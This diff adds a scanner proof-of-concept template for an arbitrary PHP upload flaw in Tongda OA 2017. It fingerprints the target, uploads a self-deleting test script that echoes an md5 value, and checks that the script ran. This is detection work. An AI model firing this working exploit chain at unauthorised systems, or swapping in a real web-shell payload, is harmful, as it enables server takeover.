@@ -1,0 +1,43 @@
+name: poc-yaml-tongda-oa-action-upload-php-upload
+binding: ddea3ce7-433e-4cff-a72a-c2f52df76d6a
+manual: true
+detail:
+    author: sharecast
+    links:
+        - https://github.com/PeiQi0/PeiQi-WIKI-Book/blob/main/docs/wiki/oa/%E9%80%9A%E8%BE%BEOA/%E9%80%9A%E8%BE%BEOA%20v2017%20action_upload.php%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E.md
+    vulnerability:
+        id: CT-416616
+        level: critical
+    warning: 该脚本会上传文件产生一个临时的无害文件，同时能够执行自删除逻辑，但是可能删除不成功
+transport: http
+set:
+    f1: randomInt(40000, 44800)
+    rboundary: randomLowercase(8)
+    randname: randomLowercase(6)
+rules:
+    r0:
+        request:
+            cache: true
+            method: GET
+            path: /inc/expired.php
+            follow_redirects: false
+        expression: response.status == 200 && response.body.bcontains(b"Office Anywhere 2017")
+    r1:
+        request:
+            cache: true
+            method: POST
+            path: /module/ueditor/php/action_upload.php?action=uploadfile
+            headers:
+                Content-Type: multipart/form-data; boundary=----WebKitFormBoundary{{rboundary}}
+                X_requested_with: XMLHttpRequest
+            body: "------WebKitFormBoundary{{rboundary}}\r\nContent-Disposition: form-data; name=\"CONFIG[fileFieldName]\"\r\n\r\nffff\r\n------WebKitFormBoundary{{rboundary}}\r\nContent-Disposition: form-data; name=\"CONFIG[fileMaxSize]\"\r\n\r\n1000000000\r\n------WebKitFormBoundary{{rboundary}}\r\nContent-Disposition: form-data; name=\"CONFIG[filePathFormat]\"\r\n\r\n{{randname}}\r\n------WebKitFormBoundary{{rboundary}}\r\nContent-Disposition: form-data; name=\"CONFIG[fileAllowFiles][]\"\r\n\r\n.php\r\n------WebKitFormBoundary{{rboundary}}\r\nContent-Disposition: form-data; name=\"ffff\"; filename=\"test.php\"\r\nContent-Type: application/octet-stream\r\n\r\n<?php echo md5({{f1}});unlink(__FILE__);?>\r\n------WebKitFormBoundary{{rboundary}}\r\nContent-Disposition: form-data; name=\"mufile\"\r\n\r\nsubmit\r\n------WebKitFormBoundary{{rboundary}}--\r\n"
+            follow_redirects: false
+        expression: response.status == 200
+    r2:
+        request:
+            cache: true
+            method: GET
+            path: /{{randname}}.php
+            follow_redirects: false
+        expression: response.status == 200 && response.body.bcontains(bytes(md5(string(f1))))
+expression: r0() && r1() && r2()
